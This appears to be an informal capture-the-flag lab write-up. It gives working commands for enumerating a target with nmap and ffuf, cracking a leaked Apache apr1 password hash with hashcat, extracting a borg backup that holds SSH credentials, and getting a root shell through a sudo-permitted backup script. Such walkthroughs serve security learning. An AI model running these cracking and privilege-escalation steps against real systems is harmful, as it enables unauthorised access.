initial network enum
```shell
nmap -sS 10.10.220.28 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 11:07 IST
Nmap scan report for 10.10.220.28
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
two ports found
- HTTP
- SSH

noting else so lets try directory busting 
```bash
ffuf -u http://10.10.220.28/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

got some pages / endpoints
- admin
- etc

admin page has a archive that we can download, extracted it and has some files
in /etc endpoint we found some of the config file and a encrypte password
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

further analysing the archive got that it is a backup of some kind and the  readme file it had a link to some kind of program borgbackup 
lets focus on decryption of the password, we can use hashcat to know the encryption
```bash
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > password
```
```bash
hashcat --show password
```
and we get the type is MD5 now we can crack it using hashcat itself
```bash
hashcat -m 1600 password /usr/share/wordlists/rockyou.txt
```
hashcat output:
```bash
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
                                                          
Session..........: hashcat
Status...........: Cracked
```

boom we got the password "squidward"
as we saw that there is a backup present we need to install needed libraries, this backup was made by borg-backup, so need need to install it we can see the info of the backup
```bash
borg info .
```
we need to enter paraphrase and we have found it i guess - squidward
we can list the archives present in the backup
```bash
borg list .
```

we need to extract it we can do it by the following 
```bash
borg extract ./final_archive::music_archive
```

we got a home directory file
searching for flag or some clue we got a secret.txt in desktop but nothing useful but in Documents there is a note.txt which has ssh username and pasword i guess
```shell
alex:S3cretP@s3
```
ans yes it is we go ssh into the system of alex and found the user.txt, completed another task,
now lets move to privilege escalation
seeing what alex can do with his permissions using
```shell
sudo -l
```
we get that he can run a backup.sh file present in etc with his privileges, analyzing the code we got that we can pass commads to its input and they will get executed, we can now use following payload to spawn privilaged bash shell here
```shell
sudo ./backup.sh -c "bash"
```
boom we are root now, going to root directory we get the root.txt flag

we have solve the lab successfully yay!!!!

